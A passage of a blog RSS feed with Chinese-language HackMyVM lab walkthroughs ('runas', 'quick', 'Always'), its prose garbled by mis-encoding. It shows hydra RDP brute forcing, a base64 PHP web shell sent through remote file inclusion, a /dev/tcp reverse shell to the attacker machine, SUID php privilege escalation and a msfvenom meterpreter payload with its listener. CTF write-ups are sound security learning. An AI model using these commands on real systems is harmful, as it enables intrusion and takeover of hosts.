<br><br>é™¤äº†80 139 445 ç½‘ç«™è¿˜å¼€æ”¾äº†3389<br>
è¿™æ˜¯rdpçš„ç«¯å£<br>
å°è¯•çˆ†ç ´<br>
ç”¨æˆ·åå­—ä¸€èˆ¬éƒ½æ˜¯é¶æœºçš„åå­—<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/runas]
â””â”€# hydra -l runas  -P  /usr/share/wordlists/rockyou.txt 192.168.56.20 rdp
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-26 21:06:11
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking rdp://192.168.56.20:3389/
[3389][rdp] host: 192.168.56.20   login: runas   password: 123456789
[3389][rdp] host: 192.168.56.20   login: runas   password: password
[3389][rdp] host: 192.168.56.20   login: runas   password: 123456
[3389][rdp] host: 192.168.56.20   login: runas   password: 12345
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-26 21:06:16

<br>çœ‹æ¥ç½‘å€æœç„¶æ˜¯ä¸ªå‘<br>è·å–è´¦å·å¯†ç <br>[3389][rdp] host: 192.168.56.20   login: runas   password: 123456789
[3389][rdp] host: 192.168.56.20   login: runas   password: password
[3389][rdp] host: 192.168.56.20   login: runas   password: 123456
[3389][rdp] host: 192.168.56.20   login: runas   password: 12345
<br>å°è¯•ç™»å½•å‘ç°éƒ½ä¸å¯¹<br>
çº³å°¼ã€‚ ã€‚ ã€‚<br><br>çœ‹æ¥è¿˜æ˜¯å¾—ä»ç½‘ç«™å…¥æ‰‹<br>
æˆ‘ä¹‹å‰è¯» desktop.ini å›æ˜¾æ˜¯ç©ºç™½æœ‰å¯èƒ½æ˜¯å› ä¸ºé‡Œé¢æ˜¯ç©ºçš„<br>
æˆ‘ç›´æ¥è¯»flagè¯•è¯•<br>
å°è¯•ä¸€ä¸‹æœ¬åœ°è¯»flag<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126223052.png" referrerpolicy="no-referrer"><br>
å“ˆå“ˆï¼ŒæˆåŠŸè¯»å–<br>HMV{User_Flag_Was_A_Bit_Bitter}

<br>åœ¨è¯•è¯•rootçš„flag<br>ä¹Ÿå¯ä»¥<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126223455.png" referrerpolicy="no-referrer"><br>HMV{Username_Is_My_Hint}
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/30.runas.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/30.runas.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.quick]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. æ–‡ä»¶åŒ…å«" data-href="#3. æ–‡ä»¶åŒ…å«" href="https://www.c1trus.top/about:blank#3._æ–‡ä»¶åŒ…å«" class="internal-link" target="_self" rel="noopener nofollow">3. æ–‡ä»¶åŒ…å«</a>
<br><a data-tooltip-position="top" aria-label="4. RFIåˆ©ç”¨" data-href="#4. RFIåˆ©ç”¨" href="https://www.c1trus.top/about:blank#4._RFIåˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">4. RFIåˆ©ç”¨</a>

<br><a data-tooltip-position="top" aria-label="4.1. å§¿åŠ¿1ï¼šdata://ä¼ªåè®®æ³•" data-href="#4.1. å§¿åŠ¿1ï¼šdata://ä¼ªåè®®æ³•" href="https://www.c1trus.top/about:blank#4.1._å§¿åŠ¿1ï¼šdata://ä¼ªåè®®æ³•" class="internal-link" target="_self" rel="noopener nofollow">4.1. å§¿åŠ¿1ï¼šdata://ä¼ªåè®®æ³•</a>
<br><a data-tooltip-position="top" aria-label="4.2. å§¿åŠ¿2: è¿œç¨‹æ–‡ä»¶åŒ…å«æ³•" data-href="#4.2. å§¿åŠ¿2: è¿œç¨‹æ–‡ä»¶åŒ…å«æ³•" href="https://www.c1trus.top/about:blank#4.2._å§¿åŠ¿2:_è¿œç¨‹æ–‡ä»¶åŒ…å«æ³•" class="internal-link" target="_self" rel="noopener nofollow">4.2. å§¿åŠ¿2: è¿œç¨‹æ–‡ä»¶åŒ…å«æ³•</a>


<br><a data-tooltip-position="top" aria-label="5. ç»•è¿‡.php" data-href="#5. ç»•è¿‡.php" href="https://www.c1trus.top/about:blank#5._ç»•è¿‡.php" class="internal-link" target="_self" rel="noopener nofollow">5. ç»•è¿‡.php</a>
<br><a data-tooltip-position="top" aria-label="6. SUID ææƒ" data-href="#6. SUID ææƒ" href="https://www.c1trus.top/about:blank#6._SUID_ææƒ" class="internal-link" target="_self" rel="noopener nofollow">6. SUID ææƒ</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Quick
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šRFI  SUIDææƒ
<br><br>ç«¯å£æ‰«æ<br>Nmap scan report for 192.168.9.5
Host is up (0.00050s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
<br>ç›®å½•æ‰«æ<br>[17:42:29] 200 -  771B  - /about.php
[17:42:36] 200 -  616B  - /contact.php
[17:42:40] 200 -    1KB - /home.php
[17:42:40] 200 -  630B  - /images/
[17:42:40] 301 -  311B  - /images  -&gt;  http://192.168.9.5/images/
<br><br>è®¿é—®ä¸€ä¸‹<br>about.php<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png" referrerpolicy="no-referrer"><br>å‘ç°ä¸»é¡µæœ‰ä¸€ä¸ªaboutæŒ‰é’®ï¼Œç‚¹å‡»å<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.002.png" referrerpolicy="no-referrer"><br>ä¼šå‘ç°ä¸‹é¢çš„å†…å®¹å°±æ˜¯about.phpé‡Œé¢çš„<br>ç»“åˆä¸€ä¸‹è¿™ä¸ªUrl <br>/index.php?page=about<br>å¾ˆå®¹æ˜“çŒœæµ‹å‡ºè¿™é‡Œæœ‰ä¸ªæ˜¯æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œè¿™é‡ŒåŒ…å«äº†about.phpæ‰€ä»¥è¿™ä¸ªç•Œé¢å°±æ˜¾ç¤ºäº†/about.phpçš„å†…å®¹<br>è¿™é‡Œæˆ‘ä»¬å°±è¦çœ‹æ˜¯æœ¬åœ°åŒ…å« è¿˜æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«äº†<br>å…ˆæµ‹è¯•è¿œç¨‹æ–‡ä»¶åŒ…å«<br>åŒç½‘æ®µä¸‹çš„kaliæ–°å»ºä¸€ä¸ªtest.php ç„¶åé‡Œé¢éšä¾¿å†™ç‚¹ä¸œè¥¿<br>ç„¶åç”¨Pythonå¯ä¸€ä¸ªhttpæœåŠ¡<br>echo '123123123' &gt;test.php
python3 -m http.server
<br>è®¿é—®ç½‘ç«™<br>http://192.168.9.5/index.php?page=http://192.168.9.3/test
<br><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.003.png" referrerpolicy="no-referrer"><br>æˆåŠŸå®ç°è¿œç¨‹æ–‡ä»¶åŒ…å«<br><br><br>å¥½å¤„ï¼š ç›´æ¥ä¼ æ•°æ®ï¼Œä¸ç”¨åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶<br>å‚è€ƒæ–‡ç« ï¼š<a data-tooltip-position="top" aria-label="https://d4redevilx.github.io/posts/hackmyvm/quick/#escalaci%C3%B3n-de-privilegios" rel="noopener nofollow" class="external-link" href="https://d4redevilx.github.io/posts/hackmyvm/quick/#escalaci%C3%B3n-de-privilegios" target="_blank">Quick</a><br>payloadï¼š<br>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnb2snIDs/Pg==
<br>è¿™è¡Œ PHP ä»£ç ä½¿ç”¨æ•°æ® URL (data URI) ç›´æ¥åœ¨ PHP ä»£ç ä¸­æä¾›æ•°æ®ï¼Œè€Œæ— éœ€è®¿é—®å¤–éƒ¨æ–‡ä»¶ã€‚ data://  è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ•°æ®url text/plain ï¼šæŒ‡å®šæ•°æ®çš„ MIME ç±»å‹ï¼Œè¿™é‡Œä¸ºçº¯æ–‡æœ¬ã€‚ ;base64 ä½¿ç”¨base64ç¼–ç  é¿å…ç‰¹æ®Šå­—ç¬¦å‡ºé”™ PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnb2snIDs/Pg== ç¼–ç æ•°æ® è§£ç ä¸º<br>
&lt;?php system($\_GET['cmd']);echo 'ok' ;?&gt;&lt;/p&gt;<br>æ‰§è¡ŒåæˆåŠŸè¾“å‡ºok<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.004.png" referrerpolicy="no-referrer"><br>æˆ‘ä»¬ä¼ å…¥å‚æ•°cmd æ‰§è¡Œå‘½ä»¤<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.005.png" referrerpolicy="no-referrer"><br>æˆåŠŸæ‰§è¡Œï¼Œç„¶ååå¼¹shellï¼Œè¿™é‡Œéœ€è¦ç”¨urlç¼–ç <br>cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.9.3%2F1234%200%3E%261%27
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.006.png" referrerpolicy="no-referrer"><br><br>åœ¨kaliä¸­å¯åŠ¨ä¸€ä¸ªæœåŠ¡å™¨<br>python3 -m http.server 1122
<br>æœåŠ¡å™¨ä¸Šå†™ä¸€ä¸ªç³»ç»Ÿé©¬é—¨<br>&lt;?php
system($\_GET['cmd']);
echo 'okok');
?&gt;
<br>è¿œç¨‹åŒ…å«åé—¨æ–‡ä»¶<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.007.png" referrerpolicy="no-referrer"><br>è¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦åŠ ä¸Š.php å› ä¸ºä»–ä¼šè‡ªåŠ¨ç»™æˆ‘ä»¬è¡¥ä¸Šï¼Œ<br>è¿™é‡Œä¹Ÿå¯ä»¥ç»•è¿‡è¿™ä¸ª.php<br><br>å¦‚åˆ©ç”¨é—®å· äº•å·ç»•è¿‡ç­‰<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.008.png" referrerpolicy="no-referrer"><br>ä½¿ç”¨#ç»•è¿‡æ—¶è¯·ç”¨urlç¼–ç <br><br>(remote) www-data@quick:/tmp$ find / -perm -4000 2&gt;/dev/null
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/bin/at
/usr/bin/sudo
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/php7.0
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
<br>è¿™é‡Œé¢å‘ç°phpå…·æœ‰suidæƒé™<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.009.png" referrerpolicy="no-referrer"><br>cd /usr/bin
CMD="/bin/sh"
./php7.0 -r "pcntl\_exec('/bin/sh', ['-p']);"
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.010.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/3.quick.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/3.quick.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/3.quick.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[29.Always]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç½‘ç«™ä¸»é¡µ" data-href="#2.1. ç½‘ç«™ä¸»é¡µ" href="https://www.c1trus.top/about:blank#2.1._ç½‘ç«™ä¸»é¡µ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç½‘ç«™ä¸»é¡µ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.3. ç½‘ç«™åå°" data-href="#2.3. ç½‘ç«™åå°" href="https://www.c1trus.top/about:blank#2.3._ç½‘ç«™åå°" class="internal-link" target="_self" rel="noopener nofollow">2.3. ç½‘ç«™åå°</a>


<br><a data-tooltip-position="top" aria-label="3. SMB" data-href="#3. SMB" href="https://www.c1trus.top/about:blank#3._SMB" class="internal-link" target="_self" rel="noopener nofollow">3. SMB</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMBç©ºä¼šè¯æ£€æµ‹" data-href="#3.1. SMBç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#3.1._SMBç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMBç©ºä¼šè¯æ£€æµ‹</a>


<br><a data-tooltip-position="top" aria-label="4. FTP" data-href="#4. FTP" href="https://www.c1trus.top/about:blank#4._FTP" class="internal-link" target="_self" rel="noopener nofollow">4. FTP</a>
<br><a data-tooltip-position="top" aria-label="5. ç½‘å€åå°" data-href="#5. ç½‘å€åå°" href="https://www.c1trus.top/about:blank#5._ç½‘å€åå°" class="internal-link" target="_self" rel="noopener nofollow">5. ç½‘å€åå°</a>

<br><a data-tooltip-position="top" aria-label="5.1. å‰æ®µéªŒè¯å¯†ç " data-href="#5.1. å‰æ®µéªŒè¯å¯†ç " href="https://www.c1trus.top/about:blank#5.1._å‰æ®µéªŒè¯å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">5.1. å‰æ®µéªŒè¯å¯†ç </a>


<br><a data-tooltip-position="top" aria-label="6. ftpç™»å½•" data-href="#6. ftpç™»å½•" href="https://www.c1trus.top/about:blank#6._ftpç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">6. ftpç™»å½•</a><br>
- <a data-tooltip-position="top" aria-label="6.1.1. ç®¡ç†å‘˜çš„æç¤º" data-href="#6.1.1. ç®¡ç†å‘˜çš„æç¤º" href="https://www.c1trus.top/about:blank#6.1.1._ç®¡ç†å‘˜çš„æç¤º" class="internal-link" target="_self" rel="noopener nofollow">6.1.1. ç®¡ç†å‘˜çš„æç¤º</a>
<br><a data-tooltip-position="top" aria-label="7. ftpç”¨æˆ·ç™»å½•" data-href="#7. ftpç”¨æˆ·ç™»å½•" href="https://www.c1trus.top/about:blank#7._ftpç”¨æˆ·ç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">7. ftpç”¨æˆ·ç™»å½•</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Always" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Always</a><br>
ä½œè€… ysnmrtksk<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# fping -aqg 192.168.56.0/24
192.168.56.2
192.168.56.6
192.168.56.19

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# fscan -h 192.168.56.19

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.19:445 open
192.168.56.19:139 open
192.168.56.19:135 open
192.168.56.19:21 open
192.168.56.19:8080 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo
[*]192.168.56.19
   [-&gt;]Always-PC
   [-&gt;]192.168.56.19
[*] OsInfo 192.168.56.19        (Windows 7 Professional 7601 Service Pack 1)
[*] WebTitle http://192.168.56.19:8080 code:200 len:178    title:We Are Sorry
å·²å®Œæˆ 5/5
[*] æ‰«æç»“æŸ,è€—æ—¶: 2.252398436s

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# curl http://192.168.56.19:8080
&lt;DOCTYPE html&gt;
&lt;head&gt;
        &lt;title&gt;We Are Sorry&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
        &lt;center&gt;&lt;h1&gt;Our Site Is Under Maintenance. Please Come Back Again Later.&lt;/h1&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
<br>æç¤ºç½‘ç«™æ­£åœ¨ç»´æŠ¤ï¼Œè¿‡ä¼šå†æ¥<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# dirsearch -u http://192.168.56.19:8080

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/Awayls/reports/http_192.168.56.19_8080/_24-11-25_22-45-05.txt

Target: http://192.168.56.19:8080/

[22:45:08] 301 -  240B  - /ADMIN  -&gt;  http://192.168.56.19:8080/ADMIN/
[22:45:08] 301 -  240B  - /Admin  -&gt;  http://192.168.56.19:8080/Admin/
[22:45:08] 200 -    3KB - /admin%20/
[22:45:08] 301 -  240B  - /admin  -&gt;  http://192.168.56.19:8080/admin/
[22:45:08] 301 -  241B  - /admin.  -&gt;  http://192.168.56.19:8080/admin./
[22:45:09] 200 -    3KB - /Admin/
[22:45:09] 200 -    3KB - /admin/
[22:45:09] 200 -    3KB - /admin/index.html
[22:45:12] 403 -  199B  - /cgi-bin/
[22:45:12] 500 -  530B  - /cgi-bin/printenv.pl
[22:45:16] 403 -  199B  - /index.php::$DATA
[22:45:24] 403 -  199B  - /Trace.axd::$DATA
[22:45:26] 403 -  199B  - /web.config::$DATA

<br><br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125224659.png" referrerpolicy="no-referrer"><br>
å°è¯•ä¸€ä¸‹ç®€å•çš„å¼±å£ä»¤<br>
æ²¡æœ‰ç™»å½•æˆåŠŸã€‚å¹¶ä¸”è¿™é‡Œæˆ‘ä»¬ä¸èƒ½æ ¹æ®å›æ˜¾åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨ã€‚<br>
å…ˆçœ‹ä¸‹SMB SMBèµ°ä¸é€šåœ¨å›æ¥çœ‹è¿™ä¸ªç½‘ç«™å°è¯•çˆ†ç ´<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# smbmap -u anonymous -H 192.168.56.19

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

<br>ä¸å­˜åœ¨ç©ºä¼šè¯ç”¨æˆ·<br>
å› ä¸ºè¿™é‡Œæ²¡æœ‰åŸŸï¼Œä¹Ÿæ²¡æœ‰å¼€æ”¾88ç«¯å£ï¼ˆKerberosçš„ç«¯å£ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸èƒ½å°è¯•è¿›è¡Œkerbruteçˆ†ç ´<br><br>æ£€æµ‹ä¸€ä¸‹ftpæ˜¯å¦å­˜åœ¨åŒ¿åç™»å½•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# ftp 192.168.56.19
Connected to 192.168.56.19.
220 Microsoft FTP Service
Name (192.168.56.19:root): anonymous
331 Password required for anonymous.
Password:
530 User cannot log in.
ftp: Login failed

<br>ä¹Ÿä¸å­˜åœ¨ftpåŒ¿åç™»å½•<br>
é‚£çœ‹æ¥åªèƒ½å¹²ç½‘ç«™äº†<br><br><br>å°è¯•æŠ“åŒ…çˆ†ç ´æ—¶å‘ç° ç‚¹äº†LoginæŠ“ä¸åˆ°åŒ…<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230241.png" referrerpolicy="no-referrer"><br>
è¯´æ˜è¿™é‡Œæ˜¯å‰æ®µéªŒè¯<br>ç›´æ¥çœ‹ä»£ç <br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230328.png" referrerpolicy="no-referrer"><br>
è·å–åˆ°ç”¨æˆ·ä¸å¯†ç <br>adminï¼šadminpass123
<br>æˆåŠŸç™»å½•åå°<br>è¿›æ¥åè·å–åˆ°äº†ä¸€ä¸ªæç¤º<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241125230433.png" referrerpolicy="no-referrer"><br>ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=
<br>è§£å¯†<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# echo 'ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=' |base64 -d
ftpuser:KeepGoingBro!!!    
<br><br>åˆ©ç”¨ç»™çš„ftpè´¦å·å¯†ç ç™»å½•<br>
ftpuser:KeepGoingBro!!! <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# ftp 192.168.56.19
Connected to 192.168.56.19.
220 Microsoft FTP Service
Name (192.168.56.19:root): ftpuser
331 Password required for ftpuser.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; ls -a
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
10-01-24  07:17PM                   56 robots.txt
226 Transfer complete.
ftp&gt; get robots.txt
local: robots.txt remote: robots.txt
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |****************************************************|    56      314.29 KiB/s    00:00 ETA
226 Transfer complete.
56 bytes received in 00:00 (103.57 KiB/s)
ftp&gt; exit
221 Goodbye.

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# cat robots.txt
User-agent: *
Disallow: /admins-secret-pagexxx.html

<br>è·å–åˆ°ä¸€ä¸ªè·¯å¾„ /admins-secret-pagexxx.html<br><br>è®¿é—®è·å–åˆ°ç®¡ç†å‘˜çš„æç¤º <br> ## Admin's Secret Notes

- 1) Disable the firewall and Windows Defender.
- 2) Enable FTP and SSH.
- 3) Start the Apache server.
- 4) Don't forget to change the password for user 'always'. Current password is "WW91Q2FudEZpbmRNZS4hLiE=".
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Awayls]
â””â”€# echo 'WW91Q2FudEZpbmRNZS4hLiE=' |base64 -d
YouCantFindMe.!.!  
<br>æ ¹æ®ç¬¬å››æ¡æç¤ºå¯ä»¥çŸ¥é“<br>
ç”¨æˆ· always<br>
å¯†ç  YouCantFindMe.!.!
<br>å°è¯•åˆ©ç”¨winrmç™»å½•<br>
å‘ç°ç™»ä¸è¿›å»ã€åŸæ¥è§£ç åçš„ä¸æ˜¯å¯†ç ã€‚è€Œæ˜¯æç¤ºğŸ˜…<br>é‚£å°±æ‰¾ä¸€ä¸‹å¯†ç å§<br><br>æ‰¾äº†åŠå¤©æ²¡æœ‰æ‰¾åˆ°ï¼Œçœ‹wpåŸæ¥è¦ç›´æ¥ä»vboxç™»å½•Ftpuserç”¨æˆ·<br>
æˆ‘å…¶å®æœ‰æµ‹è¯•è¿‡winrmç™»å½•è¿™ä¸ªç”¨æˆ·<br>
ä½†æ˜¯å¤±è´¥äº†ã€‚æˆ‘æ˜¯æ²¡æƒ³åˆ°åŸæ¥è¦ä»Vboxç™»å½•çš„ã€‚ æœç„¶æ˜¯é¶æœºå•Šã€‚å®æˆ˜å“ªé‡Œæœ‰äººæŠŠç”µè„‘æ‹¿è¿‡æ¥ç»™ä½ ç™»å•ŠğŸ˜…<br>è¿›æ¥åæŠŠå±å¹•é”®ç›˜ç‚¹å‡ºæ¥ï¼Œä¸ç„¶ä½ ä¼šè¢«æ¶å¿ƒæ­»çš„ğŸ¤®<br>
è®°å¾—æŠŠå·¦ä¸Šè§’åˆ‡æ¢æˆEN<br>
<img alt="assets/Pasted image 20241224205846.png" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/pasted-image-20241224205846.png"><br>åˆ©ç”¨å¯†ç  KeepGoingBro!!! è¿›å»ï¼Œåææƒå°±è¡Œäº†<br>ææƒå¾ˆç®€å•ã€‚æˆ‘æ€è·¯æ˜¯ç›´æ¥ä¼ ä¸€ä¸ªcsåé—¨ï¼Œç„¶åç›´æ¥æå°±è¡Œäº†ã€‚<br>
<img alt="assets/Pasted image 20241224210216.png" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/pasted-image-20241224210216.png"><br>ç”Ÿæˆmsfåé—¨ä¸Šä¼  ä¸Šå»ç„¶åè¿è¡Œä¸Šçº¿msf<br>ç”Ÿæˆåé—¨
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.6 lport=7788 -f exe &gt; msf7788.exe

å¼€å¯ç›‘å¬
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.6
set lport 7788
run

msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 192.168.56.6:7788
